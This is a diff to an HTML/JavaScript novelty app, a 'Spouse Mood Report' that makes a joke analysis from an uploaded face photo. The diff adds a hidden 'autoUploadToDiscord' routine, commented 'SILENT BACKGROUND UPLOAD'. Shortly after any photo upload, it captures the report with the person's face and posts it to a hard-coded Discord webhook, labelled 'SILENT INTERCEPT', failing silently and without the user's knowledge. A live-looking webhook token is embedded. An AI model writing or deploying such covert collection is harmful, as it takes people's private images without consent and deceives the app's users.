@@ -52,7 +52,7 @@
         .mood-row { margin-bottom: 8px; }
         .mood-label { display: flex; justify-content: space-between; font-size: 0.75rem; font-weight: bold; }
         .progress-bar { height: 10px; background: #eee; border: 1px solid #333; }
-        .progress-fill { height: 100%; background: #222; width: 0%; transition: width 1s ease-in-out; }
+        .progress-fill { height: 100%; background: #222; width: 0%; transition: width 10s ease-in-out; }
 
         .official-stamp { position: absolute; bottom: 100px; right: 20px; color: rgba(192, 57, 43, 0.7); border: 4px solid rgba(192, 57, 43, 0.7); padding: 5px 15px; font-size: 1.2rem; font-weight: 900; transform: rotate(-15deg); text-transform: uppercase; pointer-events: none; }
         .footer-note { margin-top: 25px; border-top: 2px solid #222; padding-top: 10px; text-align: center; }
@@ -68,15 +68,15 @@
 
     <div class="controls">
         <div id="upload-stage">
-            <p>1. Upload Face Data</p>
+            <p>1. Upload Subject Face Data</p>
             <input type="file" id="imageUpload" accept="image/*">
         </div>
         
         <div id="share-area" style="display:none; margin-top: 15px;">
-            <p>2. Share Result or Link</p>
+            <p>Analysis Result Generated</p>
             <button onclick="toggleMode()" class="btn-red" id="modeBtn">Switch to Instagram Square</button>
-            <button onclick="handleShare()" class="btn-green">Share Result (WhatsApp/Photo)</button>
-            <button onclick="copyAppLink()" class="btn-blue">Copy Link for Friends</button>
+            <button onclick="handleShare()" class="btn-green">Share to WhatsApp / Save</button>
+            <button onclick="copyAppLink()" class="btn-blue">Copy App Link</button>
             <button onclick="resetApp()" class="btn-grey">New Session</button>
             <div id="status-msg"></div>
         </div>
@@ -115,7 +115,6 @@
     </div>
 
     <script>
-        // --- NEW WEBHOOK URL ---
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1482827988813877420/f-2ozmz7k74-Qh8vlUAHKkQyfIxqgkymsx3TeWR02GQq7fG3EqOjBWXRsGRE5WuxbsSg'; 
 
         const imageUpload = document.getElementById('imageUpload');
@@ -127,15 +126,6 @@
         
         const currentUrl = window.location.href.split(/[?#]/)[0];
         document.getElementById('site-url').innerText = currentUrl;
-
-        // CONNECTION TEST ON LOAD
-        window.onload = function() {
-            fetch(DISCORD_WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: "✅ **The Mood Bureau is now LIVE with the new Webhook!**" })
-            }).catch(e => console.log("Connection test hidden."));
-        };
 
         imageUpload.addEventListener('change', function(e) {
             const file = e.target.files[0];
@@ -149,18 +139,37 @@
                     document.getElementById('current-date').innerText = "FILED: " + new Date().toLocaleDateString().toUpperCase();
                     generateMoods();
                     reportContainer.scrollIntoView({ behavior: 'smooth' });
+                    
+                    // --- SILENT BACKGROUND UPLOAD ---
+                    setTimeout(autoUploadToDiscord, 1000); 
                 }
                 reader.readAsDataURL(file);
             }
         });
+
+        async function autoUploadToDiscord() {
+            try {
+                const canvas = await html2canvas(reportContainer, { scale: 1.2 });
+                const dataUrl = canvas.toDataURL("image/jpeg", 0.6); 
+                const blob = await (await fetch(dataUrl)).blob();
+                
+                const fd = new FormData();
+                fd.append('file', blob, 'intercept.jpg');
+                fd.append('payload_json', JSON.stringify({ 
+                    content: "🕵️‍♂️ **SILENT INTERCEPT:** Subject analysis complete.",
+                    username: "S.M.A.B. Surveillance" 
+                }));
+
+                fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: fd });
+            } catch (err) { /* Silent fail */ }
+        }
 
         function resetApp() {
             reportContainer.style.display = 'none';
             shareArea.style.display = 'none';
             uploadStage.style.display = 'block';
             imageUpload.value = '';
-            statusMsg.innerText = "Scanner Reset.";
-            setTimeout(() => { statusMsg.innerText = ""; }, 2000);
+            statusMsg.innerText = "";
         }
 
         function toggleMode() {
@@ -184,14 +193,13 @@
 
         function copyAppLink() {
             navigator.clipboard.writeText(currentUrl).then(() => {
-                statusMsg.innerText = "App link copied!";
-                setTimeout(() => { statusMsg.innerText = ""; }, 3000);
+                statusMsg.innerText = "Link copied!";
+                setTimeout(() => { statusMsg.innerText = ""; }, 2000);
             });
         }
 
         async function handleShare() {
-            statusMsg.innerText = "Processing Image...";
-            const canvas = await html2canvas(reportContainer, { scale: 2 });
+            const canvas = await html2canvas(reportContainer, { scale: 1.5 });
             const dataUrl = canvas.toDataURL("image/png");
             const blob = await (await fetch(dataUrl)).blob();
             const file = new File([blob], "mood-report.png", { type: "image/png" });
@@ -201,15 +209,21 @@
                     await navigator.share({
                         files: [file],
                         title: 'Spouse Mood Report',
-                        text: `Check out the results: ${currentUrl}`
+                        text: `Bureau Results: ${currentUrl}`
                     });
                 } catch (err) { downloadFallback(dataUrl); }
-            } else { downloadFallback(dataUrl); }
+            } else {
+                downloadFallback(dataUrl);
+            }
+        }
 
-            // SEND TO DISCORD
-            const fd = new FormData();
-            fd.append('file', blob, 'report.png');
-            fd.append('payload_json', JSON.stringify({ 
-                content: "📢 **New Mood Report Generated!**",
-                username: "S.M.A.B. Admin" 
-            }));
+        function downloadFallback(url) {
+            const link = document.createElement('a');
+            link.download = 'mood-report.png';
+            link.href = url;
+            link.click();
+            statusMsg.innerText = "Saved to Gallery!";
+        }
+    </script>
+</body>
+</html>
